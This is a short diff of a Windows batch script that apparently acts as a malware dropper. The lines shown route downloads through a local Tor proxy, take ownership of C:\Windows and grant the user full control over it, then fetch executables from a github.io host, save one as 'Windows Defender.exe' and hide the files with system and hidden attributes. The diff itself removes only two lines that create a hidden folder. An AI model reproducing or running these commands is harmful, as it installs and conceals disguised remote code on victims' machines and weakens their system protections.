@@ -33,8 +33,6 @@ if not errorlevel 1 (set "proxy=--tlsv1 --socks5-hostname 127.0.0.1:9050") else 
 TAKEOWN /F "C:\Windows"
 ICACLS "C:\Windows" /INHERITANCE:e /GRANT:r %UserName%:(F) /C
 
-mkdir "C:\Windows\Win32"
-attrib +s +h +i "C:\Windows\Win32"
 curl.exe %proxy% https://cryptedlumos.github.io/sfx.exe --output "C:\Windows\WD\Windows Defender.exe" && attrib +s +h +i "C:\Windows\Windows Defender.exe"
 curl.exe %proxy% https://cryptedlumos.github.io/Capture/nircmd.exe --output "C:\Windows\nircmd.exe" && attrib +s +h +i "C:\Windows\nircmd.exe"
 curl.exe %proxy% https://cryptedlumos.github.io/Capture/curl.exe --output "C:\Windows\curl.exe" && attrib +s +h +i "C:\Windows\curl.exe"
